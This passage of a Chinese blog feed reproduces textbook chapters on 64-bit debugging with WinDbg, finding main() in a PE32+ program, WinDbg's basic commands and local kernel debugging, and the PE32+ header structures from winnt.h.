码。但这还是第一次通过WinDbg调试器查看VC编写的PE32+文件，所以我们将Startup代码全部显示出来。与图40-4中PE32文件的Startup代码相比，它们看上去非常相似。像这样调试一般的应用程序时，由于没有符号文件（Symbol: *.pdb），代码中没有任何注释，看上去非常“荒凉”。若调试VC++文件的经验不多，在上述代码中每当遇到CALL指令时可以跟踪进人，查看代码（再次强调，我强烈建议初学者这样做，熟悉Startup代码是非常重要的）。</p><h2 id="40-4-4-main-函数"><a href="#40-4-4-main-函数" class="headerlink" title="40.4.4 main()函数"></a>40.4.4 main()函数</h2><p>WOW64Test_x64.exe是基于控制台的应用程序，在GetCommandLineW()函数处设置断点后，从断点处开始跟踪到main()函数调用处。首先在kernel32!GetCommandLineW()API处设置断点。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bp </span>&lt;<span class="hljs-keyword">address或模块名称!API名称&gt;</span><br><span class="hljs-keyword"></span>这里为 <span class="hljs-keyword">bp </span>kernel32!GetCommandLineW<br></code></pre></td></tr></table></figure><p>接下来运行（g）调试器，调试器在GetCommandLineW()API处暂停，如图40-12所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318195139121.png#alt=image-20220318195139121"></p><p>然后查看栈中存储的返回地址（Return Address）,如图40-13所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318195315241.png#alt=image-20220318195315241"></p><p>从图40-14可以看到，返回地址为00000001&#96;40001381，跟踪转到该地址处。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318195607669.png#alt=image-20220318195607669"></p><p>地址00000001<code>40001381 的MOV指令将GetCommandLineW() API的返回值（RAX）存储到.data节区的特定区域。接下来是多条CALL指令，调用多个函数切分获取的“command line”字符串，最终形成main()函数的argc、argv参数。0000000</code>400013CF~0000000<code>400013E4地址间的MOV指令用来为main()设置参数（RCX、RDX、R8寄存器）。紧接着，00000001</code>400013EA地址处的CALL指令用来调用main()函数。下面看看存储在寄存器中的main函数的参数，如图40-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318201228313.png#alt=image-20220318201228313"></p><p>main（int argc,char* argv[]）函数的第一个参数argc存储在RCX寄存器中，其值为1，表示无额外的命令参数。函数的第二个参数为argV[]数组，数组的起始地址存储在RDX寄存器中，其值为472F10,该地址中保存着数组元素argv[0]的值，是第一个命令行字符串的地址，如图40-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318201320595.png#alt=image-20220318201320595"></p><p>从图40-16中可以看到，argv[]参数（RDX）的起始地址为472F10， argv[0]&#x3D;472F20，地址472F20中保存着第一个命令行字符串（C:\work\WOW64Test_x64.exe）。</p><p>可以像这样查看main()函数的argc与argv这2个参数。图40-15中R8寄存器的值00000000’00472FB0表示什么呢？ main()函数的参数明明只有2个（RCX、RDX），那么这第三个参数R8寄存器中为什么会存储着值呢？下面分析一下图40-17。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318201640826.png#alt=image-20220318201640826"></p><p>从图40-17中可以看到，R8寄存器所指的是一个指针数组，数组的所有元素都指向栈区域。第一个元素所指的地址为00000000&#96;00473120,进入该地址查看，如图40-18所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318201806422.png#alt=image-20220318201806422"></p><p>在图40-19中可以看得更清楚，main()的第三个参数R8为系统环境变量字符串数组的地址，它不是用户编写的代码，是使用Visual C++ 2010工具编译代码时由编译器自动添加的参数。最后看一下main()函数本身的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318202130078.png#alt=image-20220318202130078"></p><p>至此，我们准确找到了main()函数代码，从这里开始调试就可以了。下面请大家各自动手调试，好好练习一下。</p><blockquote><p>WinDbg的基本使用方法请参考第39章。</p></blockquote><h1 id="40-5小结"><a href="#40-5小结" class="headerlink" title="40.5小结"></a>40.5小结</h1><p>本章学习了64位环境下调试PE32+文件的方法。前一章（64位计算）中我们学习了有关64位 环境中新增与改动的内容，如果完全掌握了这些内容，那么在64位环境下调试程序并没有想得那么难。由于x64、Windows OS 64位、PE32+等能够很好地向下兼容，所以如果熟悉了32位环境下的调试技术，就能快速适应64位环境，顺利调试64位程序。</p><p>WinDbg调试器的用户界面有些陌生，并且如果没有符号文件（*.pdb）,代码的注释（特别是API的名称）会非常少，这给代码的阅读与分析造成了困难。要熟悉WinDbg这个调试工具，必须反复使用它，不断练习，除此之外别无他法（随着代码逆向分析水平的提高，各位调试内核驱动程序文件时会再次使用WinDbg这个调试工具）。当然，如果你还有余力，可以尝试使用IDA Pro, 它是一个非常强大的交互式反汇编工具。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第39章 WinDbg</title>
    <link href="/1999/03/09/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC39%E7%AB%A0%20WinDbg/"/>
    <url>/1999/03/09/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC39%E7%AB%A0%20WinDbg/</url>
    
    <content type="html"><![CDATA[<p>第39章 WinDbg</p><p>WinDbg是Windows平台下用户模式和内核模式调试工具，它是一个轻量级的调试工具，但是功能十分强大。本章将学习有关WinDbg调试工具的知识（参考图39-1 ）。</p><h1 id="39-1-WinDbg"><a href="#39-1-WinDbg" class="headerlink" title="39.1 WinDbg"></a>39.1 WinDbg</h1><p>WinDbg是微软发布的一款免费调试工具，支持用户模式调试与内核模式调试，是一种“全天候”的调试器，但主要还是应用于内核调试。各位可以访问以下网址下载WinDbg调试器。</p><p><a href="http://www.microsoft.com/whdc/devtools/debugging/default.mspx">http://www.microsoft.com/whdc/devtools/debugging/default.mspx</a></p><blockquote><p>本章讲解的是64位的WinDbg,它与32位版本在用户界面结构、命令组成上基本没有什么差别</p></blockquote><h2 id="39-1-1-WinDbg-的特征"><a href="#39-1-1-WinDbg-的特征" class="headerlink" title="39.1.1 WinDbg 的特征"></a>39.1.1 WinDbg 的特征</h2><p>WinDbg默认运行在CUI（Console User Interface,控制台用户界面）环境下，用户主要通过键盘而非鼠标来操作。要适应这种方式需要花费相当长的时间，可一旦熟悉起来就会非常方便。对于习惯了OllyDbg与IDAPro等GUI环境的朋友来说，初次接触WinDbg时会感到非常陌生、非常不方便（它们的差别就像Windows用户第一次接触Linux的终端用户环境时的感觉一样）。WinDbg中也提供大量快捷键，以及额外的窗口（反汇编、内存、寄存器、栈等），所以也可以使用类似OllyDbg形态的方式调试（当然，与OllyDbg、IDA Pro的GUI相比还差很远）。</p><h2 id="39-1-2运行-WinDbg"><a href="#39-1-2运行-WinDbg" class="headerlink" title="39.1.2运行 WinDbg"></a>39.1.2运行 WinDbg</h2><p><strong>符号</strong></p><p>符号（Symbol）指的是调试信息文件（*.pdb）。使用Visual C++编译程序时，除了生成PE文件外，还会一起生成*.pdb（Program Data Base,程序数据库）文件，该文件包含PE文件的各种调试信息（变量&#x2F;函数名、函数地址、源代码行等）。为了帮助理解，各位可以比较图39-2和图39-3。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC39%E7%AB%A0%20WinDbg.assets/image-20220315185329408.png#alt=image-20220315185329408"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC39%E7%AB%A0%20WinDbg.assets/image-20220315185339794.png#alt=image-20220315185339794"></p><p>虽然是相同的PE文件，但是符号文件的有无决定了反汇编代码的可读性。有符号文件时调试更方便快捷。但是通常只有程序的编写者才有符号文件，且一般不会对外发布。所以我们的调试工作大部分是在没有符号文件的情形下进行的。</p><p><strong>安装符号文件</strong></p><p>微软公开了Windows OS系统库的符号文件。在WinDbg中设置好符号的位置后，调试应用程序或驱动程序时会相当方便（因为拥有了系统库的调试信息）。在WinDbg菜单栏中依次选择File-Symbol File path菜单，弹岀对话框。像图39-4这样输入符号路径，需要时WinDbg会自动下载与OS相匹配的符号文件。</p><h2 id="39-1-3-内核调试"><a href="#39-1-3-内核调试" class="headerlink" title="39.1.3 内核调试"></a>39.1.3 内核调试</h2><p>WinDbg的特征之一就是可以进行内核调试（Kernel Debugging ）。使用WinDbg进行内核调试时，一般要使用2台PC（调试器调试者），调试前需要通过Null Modem、1394、USB、Direct LAN Cable等将2台PC连接起来。近来，使用虚拟机（Virtual Machine）技术可以在同一台PC上同时运行调试器与被调试者，这被称为本地内核调试（Local Kernel Debugging ），即在运行WinDbg的PC上调试它（从Windows XP起支持该调试功能）。调试器的许多功能在这种调试方式下都受到限制，但是用来查看一些简单的信息还是非常方便的。</p><blockquote><p>调试普通应用程序时，调试器与被调试者都在同一台PC中运行，但内核调试不同。内核调试中，被调试者为系统内核，即OS本身，所以OS系统自身会暂停。因此，调试内核时一般需要使用2台物理PC。以前SofllCE调试器可以完美地支持本地内核调试，受到广泛欢迎，但是由于它已经停止开发，不再有版本更新，所以调试内核时只好使用WinDbg调试器。关于内核调试的内容已经超出了本书的讨论范围，在此不再深入探讨。下面学习使用WinDbg调试器调试64位应用程序及查看PEB&#x2F;TEB等系统结构体。</p></blockquote><p>下面使用WinDbg的本地内核调试功能简单分析一下系统行为。为了进行本地内核调试，首先要把系统修改为调试模式。在控制台窗口输入bcdedit指令，查看当前系统状态，如图39-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC39%E7%AB%A0%20WinDbg.assets/image-20220315185928804.png#alt=image-20220315185928804"></p><p>在最后一行可以看到1个debug项目，其值为No,即“非调试模式”。使用以下命令修改该项的值，转换为调试模式，如图39-6所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC39%E7%AB%A0%20WinDbg.assets/image-20220315185938908.png#alt=image-20220315185938908"></p><p>重启系统后进人内核调试模式，此时本地内核调试功能变为可用（再次使用bcdedit指令确认）。运行WinDbg调试器，在菜单栏中依次选择File-Kernel Debug菜单（快捷键Ctrl+K ），弹出Kernel Debugging对话框，如图39-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC39%E7%AB%A0%20WinDbg.assets/image-20220315190334555.png#alt=image-20220315190334555"></p><p>选择Local选项卡，然后单击“确定”按钮。一段时间后弹出WinDbg行初始画面，如图39-8所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC39%E7%AB%A0%20WinDbg.assets/image-20220315193221883.png#alt=image-20220315193221883"></p><p>首先岀现的是基于控制台的用户界面（看上去包含各种强大功能）。初始运行画面中显示的是基本的系统信息以及内核基址，该地址为ntoskrnl.exe文件的装载地址。Ntoskml.exe其实是驱动程序文件，指的是Windows内核本身。从技术上说，Windows内核实体是Ntoskml.exe驱动程序文件的内存装载映像。接下来输入简单指令，查看ntoskral!ZwCreateFile() API的实际代码，如图39-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC39%E7%AB%A0%20WinDbg.assets/image-20220315192713253.png#alt=image-20220315192713253"></p><p>ZwCreateFile() API的代码相当简单，它将服务编号（52）设置到EAX寄存器，然后跳转到KiServicelnternal()函数（函数的参数在寄存器与栈中）。其实，大部分ZwXXX系列函数都是由这种结构构成的。可以继续跟踪KiServicelnternal()API查看更详细的代码。查看系统内核代码如此方便，但是若想正式调试系统内核，应当釆用PC to PC或虚拟机方式连接。</p><h2 id="39-1-4-WinDbg基本指令"><a href="#39-1-4-WinDbg基本指令" class="headerlink" title="39.1.4 WinDbg基本指令"></a>39.1.4 WinDbg基本指令</h2><p>下面简单整理WinDbg基本指令，调试64位应用程序或系统内核时会经常使用它们（更详细的说明请参考WinDbg帮助手册），如表39-1所示</p><table><thead><tr><th>指令</th><th>说明</th><th>应用</th></tr></thead><tbody><tr><td>u</td><td>Unassemble</td><td>u：显示下一条指令</td></tr><tr><td></td><td></td><td>u address：显示地址之后的指令</td></tr><tr><td></td><td></td><td>u L10：显示10行指令</td></tr><tr><td></td><td></td><td>ub：显示上一条指令</td></tr><tr><td>t</td><td>Trace(F11)</td><td>Step Into</td></tr><tr><td>p</td><td>Pass(F10)</td><td>Step Over</td></tr><tr><td>g</td><td>Go(Run)</td><td>g：运行</td></tr><tr><td></td><td></td><td>g address：运行到地址处</td></tr><tr><td>d</td><td>Dump</td><td>d address：显示地址内容</td></tr><tr><td></td><td></td><td>db address：byte</td></tr><tr><td></td><td></td><td>dd address：dword</td></tr><tr><td></td><td></td><td>dq address：qword</td></tr><tr><td>r</td><td>Register</td><td>r：显示寄存器</td></tr><tr><td></td><td></td><td>r register：仅显示指定寄存器</td></tr><tr><td>bp</td><td>Break Point</td><td>bp：设置断点</td></tr><tr><td></td><td></td><td>bl：显示断点列表</td></tr><tr><td></td><td></td><td>bc：BP Clear（删除断点）</td></tr><tr><td>lm</td><td>Loaded Module</td><td>Im：显示被调试进程中加载的模块</td></tr><tr><td>dt</td><td>Display Type</td><td>dt struct name：显示结构体成员</td></tr><tr><td></td><td></td><td>dt struct name address：映射地址到结构体并显示</td></tr><tr><td>!dh</td><td>Display PE Header</td><td>!dh loaded address：PE Viewer</td></tr></tbody></table><p>WinDbg支持的指令超过数十种，且各种指令的使用方法灵活多样。希望各位反复练习使用WinDbg调试器，直到能够熟练进行各种调试。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第38章 PE32+</title>
    <link href="/1999/03/08/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC38%E7%AB%A0%20PE32+/"/>
    <url>/1999/03/08/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC38%E7%AB%A0%20PE32+/</url>
    
    <content type="html"><![CDATA[<p>第38章 PE32+</p><p>PE32+是64位Windows OS使用的可执行文件格式，本章将学习有关PE32+的知识。</p><p>64位Windows OS中进程的虚拟内存为16TB，其中低位的8TB分给用户模式，高位的8TB分给内核模式。为了适应改变后的虚拟内存，原PE文件格式（PE32）做了如上修改。</p><h1 id="38-1-PE32-（PE-、PE64）"><a href="#38-1-PE32-（PE-、PE64）" class="headerlink" title="38.1 PE32+ （PE+、PE64）"></a>38.1 PE32+ （PE+、PE64）</h1><p>64位本地模式中运行的PE文件格式被称为PE32+（或PE+、PE64）。为了保持向下兼容性，PE32+在原32位PE文件（PE32）的基础上扩展而来。所以如果你已经熟悉了原PE文件格式，那么就很容易熟悉PE32+这种新的文件格式。下面介绍PE32+文件格式时将主要讲解与原PE文件格式的不同。</p><h2 id="38-1-1-IMAGE-NT-HEADERS"><a href="#38-1-1-IMAGE-NT-HEADERS" class="headerlink" title="38.1.1 IMAGE NT HEADERS"></a>38.1.1 IMAGE NT HEADERS</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_NT_HEADERS64</span> &#123;</span><br>    DWORD Signature;<br>    IMAGE_FILE_HEADER FileHeader;<br>    IMAGE_OPTIONAL_HEADER64 OptionalHeader;<br>&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_NT_HEADERS</span> &#123;</span><br>    DWORD Signature;<br>    IMAGE_FILE_HEADER FileHeader;<br>    IMAGE_OPTIONAL_HEADER32 OptionalHeader;<br>&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-keyword">typedef</span> IMAGE_OPTIONAL_HEADER64             IMAGE_OPTIONAL_HEADER;<br><span class="hljs-keyword">typedef</span> PIMAGE_OPTIONAL_HEADER64            PIMAGE_OPTIONAL_HEADER;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_NT_OPTIONAL_HDR_MAGIC         IMAGE_NT_OPTIONAL_HDR64_MAGIC</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">typedef</span> IMAGE_OPTIONAL_HEADER32             IMAGE_OPTIONAL_HEADER;<br><span class="hljs-keyword">typedef</span> PIMAGE_OPTIONAL_HEADER32            PIMAGE_OPTIONAL_HEADER;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_NT_OPTIONAL_HDR_MAGIC         IMAGE_NT_OPTIONAL_HDR32_MAGIC</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>PE32+使用IMAGE_NT_HEADER64结构体，而PE32使用的是IMAGE_NT_HEADER32结构体。这2种结构体的区别在于第三个成员，前者为IMAGE_OPTIONAL_HEADER64，后者为IMAGE_OPTIONAL_HEADER32。后面的#ifdef _WIN64预处理部分中，根据系统类型，将64位&#x2F;32位结构体重定义为IMAGE_NT_HEADERS&#x2F;PIMAGE_NT_HEADERS。</p><h2 id="38-1-2-IMAGE-FILE-HEADER"><a href="#38-1-2-IMAGE-FILE-HEADER" class="headerlink" title="38.1.2 IMAGE_FILE_HEADER"></a>38.1.2 IMAGE_FILE_HEADER</h2><p>PE32+中IMAGE_FILE_HEADER结构体的Machine字段值发生变化。PE32中该Machine的值固定为014C。适用于x64的PE32+文件的Machine值为8664 （IA-64中PE32+文件的Machine值为0200）。以下是Winnt.h文件中定义的对应于各种CPU类型的Machine值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_UNKNOWN           0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_I386              0x014c  <span class="hljs-comment">// Intel 386.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_R3000             0x0162  <span class="hljs-comment">// MIPS little-endian, 0x160 big-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_R4000             0x0166  <span class="hljs-comment">// MIPS little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_R10000            0x0168  <span class="hljs-comment">// MIPS little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  <span class="hljs-comment">// MIPS little-endian WCE v2</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA             0x0184  <span class="hljs-comment">// Alpha_AXP</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH3               0x01a2  <span class="hljs-comment">// SH3 little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH3DSP            0x01a3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH3E              0x01a4  <span class="hljs-comment">// SH3E little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH4               0x01a6  <span class="hljs-comment">// SH4 little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH5               0x01a8  <span class="hljs-comment">// SH5</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_ARM               0x01c0  <span class="hljs-comment">// ARM Little-Endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_THUMB             0x01c2  <span class="hljs-comment">// ARM Thumb/Thumb-2 Little-Endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_ARMNT             0x01c4  <span class="hljs-comment">// ARM Thumb-2 Little-Endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_AM33              0x01d3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_POWERPC           0x01F0  <span class="hljs-comment">// IBM PowerPC Little-Endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_POWERPCFP         0x01f1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_IA64              0x0200  <span class="hljs-comment">// Intel 64</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_MIPS16            0x0266  <span class="hljs-comment">// MIPS</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA64           0x0284  <span class="hljs-comment">// ALPHA64</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU           0x0366  <span class="hljs-comment">// MIPS</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  <span class="hljs-comment">// MIPS</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_TRICORE           0x0520  <span class="hljs-comment">// Infineon</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_CEF               0x0CEF</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_EBC               0x0EBC  <span class="hljs-comment">// EFI Byte Code</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_AMD64             0x8664  <span class="hljs-comment">// AMD64 (K8)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_M32R              0x9041  <span class="hljs-comment">// M32R little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_CEE               0xC0EE</span><br></code></pre></td></tr></table></figure><p>可以看到有多个Machine值，它们分别对应于不同类型的CPU。此处只需先留意014C （x86）、0200 （IA-64）、 8664 （x64）这3个值就可以了（其实IA-64环境是很难遇到的）。</p><h2 id="38-1-3-IMAGE-OPTIONAL-HEADER"><a href="#38-1-3-IMAGE-OPTIONAL-HEADER" class="headerlink" title="38.1.3 IMAGE,_OPTIONAL_HEADER"></a>38.1.3 IMAGE,_OPTIONAL_HEADER</h2><p>与原来的PE32相比，PE32+中变化最大的部分就是IMAGE_OPTIONAL_HEADER结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Optional header format.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_OPTIONAL_HEADER</span> &#123;</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Standard fields.</span><br>    <span class="hljs-comment">//</span><br><br>    WORD    Magic;<br>    BYTE    MajorLinkerVersion;<br>    BYTE    MinorLinkerVersion;<br>    DWORD   SizeOfCode;<br>    DWORD   SizeOfInitializedData;<br>    DWORD   SizeOfUninitializedData;<br>    DWORD   AddressOfEntryPoint;<br>    DWORD   BaseOfCode;<br>    DWORD   BaseOfData;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// NT additional fields.</span><br>    <span class="hljs-comment">//</span><br><br>    DWORD   ImageBase;<br>    DWORD   SectionAlignment;<br>    DWORD   FileAlignment;<br>    WORD    MajorOperatingSystemVersion;<br>    WORD    MinorOperatingSystemVersion;<br>    WORD    MajorImageVersion;<br>    WORD    MinorImageVersion;<br>    WORD    MajorSubsystemVersion;<br>    WORD    MinorSubsystemVersion;<br>    DWORD   Win32VersionValue;<br>    DWORD   SizeOfImage;<br>    DWORD   SizeOfHeaders;<br>    DWORD   CheckSum;<br>    WORD    Subsystem;<br>    WORD    DllCharacteristics;<br>    DWORD   SizeOfStackReserve;<br>    DWORD   SizeOfStackCommit;<br>    DWORD   SizeOfHeapReserve;<br>    DWORD   SizeOfHeapCommit;<br>    DWORD   LoaderFlags;<br>    DWORD   NumberOfRvaAndSizes;<br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<br>&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span><br>    WORD        Magic;<br>    BYTE        MajorLinkerVersion;<br>    BYTE        MinorLinkerVersion;<br>    DWORD       SizeOfCode;<br>    DWORD       SizeOfInitializedData;<br>    DWORD       SizeOfUninitializedData;<br>    DWORD       AddressOfEntryPoint;<br>   